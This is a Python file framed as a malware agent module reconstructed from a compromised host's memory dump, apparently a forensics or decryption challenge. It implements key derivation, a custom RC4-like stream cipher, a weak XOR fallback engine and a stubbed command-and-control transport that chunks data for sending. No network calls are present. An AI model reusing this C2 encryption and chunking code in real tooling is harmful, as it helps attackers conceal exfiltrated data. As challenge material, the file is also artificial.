"""
agent_module.py - Recovered from compromised host
Build: 3.2.1-release | Target: x86_64-linux
WARNING: Reconstructed from partial memory dump - fragments may be incomplete

Symbol table (libcrypto.so):
  se_init, se_transform  -- primary stream cipher engine
  re_init, re_transform  -- recovery/fallback XOR engine

Engine dispatch:
  Session enc_mode field controls engine selection in _Transport.negotiate().
  NOTE: enc_mode may be set by operator override and may not reflect
  the actual negotiated cipher mode used at runtime.
"""

import hashlib as _H
import base64 as _B64

_PHI = 0x9E3779B9


def _xb(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


class _KDF:
    """Key derivation facility for stream engine path."""

    @staticmethod
    def derive(cfg, frags, sess):
        _n = cfg['node_id'].encode('utf-8')
        _d = _H.md5(_n).digest()
        _p = bytes.fromhex(frags['primary'])
        _tk = bytes.fromhex(sess['auth_token'])
        _s = _B64.b64decode(frags['secondary'])
        return _xb(_p, _tk[:8]) + _xb(_s, _d[:8])

    @staticmethod
    def tweak(sid):
        return _H.sha256(sid.encode('utf-8')).digest()[:8]


class _SubTable:
    """Substitution table generator."""

    def __init__(self, km):
        self._t = list(range(256))
        _j = 0
        for _i in range(256):
            _j = (_j + self._t[_i] + km[_i % len(km)]) % 256
            self._t[_i], self._t[_j] = self._t[_j], self._t[_i]

    def get(self):
        return list(self._t)


class StreamEngine:
    """Core stream transformation engine (se_init/se_transform path)."""

    _BLK = 256
    _FB = 16

    def __init__(self, key, tweak):
        self._s = _SubTable(key).get()
        self._tw = tweak
        self._ctr = 0

    def _refresh(self, fb_data):
        """Refresh substitution state with feedback data."""
        _j = 0
        for _i in range(256):
            _j = (_j + self._s[_i] + fb_data[_i % len(fb_data)]) % 256
            self._s[_i], self._s[_j] = self._s[_j], self._s[_i]

    def transform(self, buf):
        """Forward-transform a data buffer."""
        out = bytearray()
        for _i, _b in enumerate(buf):
            _g = self._ctr + _i
            _sb = self._s[_b]
            _tw = self._tw[_g % len(self._tw)]
            _pv = ((_g + 1) * _PHI) & 0xFF
            out.append(_sb ^ _tw ^ _pv)
            if (_g + 1) % self._BLK == 0:
                _fb = bytes(out[max(0, len(out) - self._FB):])
                self._refresh(_fb)
        self._ctr += len(buf)
        return bytes(out)


class _RecoveryEngine:
    """Fallback XOR cipher for degraded-mode operation (re_init/re_transform path)."""

    def __init__(self, entropy, iv):
        self._k = _H.sha256(entropy + iv).digest()[:16]

    def transform(self, buf):
        return bytes(b ^ self._k[i % len(self._k)] for i, b in enumerate(buf))


class _Transport:
    """C2 transport layer (stub - network I/O stripped)."""

    def __init__(self, endpoint, session):
        self._ep = endpoint
        self._sid = session['session_id']
        self._seq = 0

    def negotiate(self, session):
        """Negotiate cipher mode with C2 server.
        WARNING: This method body was not recovered from the memory dump.
        The enc_mode field in the session table may have been set by
        operator override rather than this negotiation."""
        pass

    def queue(self, data, chunk_sz=300):
        import os as _os
        chunks = []
        for off in range(0, len(data), chunk_sz):
            chunk = data[off:off + chunk_sz]
            cid = _H.md5(_os.urandom(8)).hexdigest()[:12]
            chunks.append((self._seq, cid, chunk))
            self._seq += 1
        return chunks


def init_session(db_config, db_fragments, db_session):
    """Initialize an encrypted session from database parameters.
    Engine selection depends on session enc_mode (set during negotiation)."""
    mode = db_session.get('enc_mode', 'stream')
    if mode == 'recovery':
        return init_recovery(db_config)
    key = _KDF.derive(db_config, db_fragments, db_session)
    tw = _KDF.tweak(db_session['session_id'])
    return StreamEngine(key, tw)


def init_recovery(db_config):
    """Initialize recovery-mode engine (uses entropy_pool from config)."""
    ep = _B64.b64decode(db_config.get('entropy_pool', ''))
    return _RecoveryEngine(ep, b'\x00' * 16)
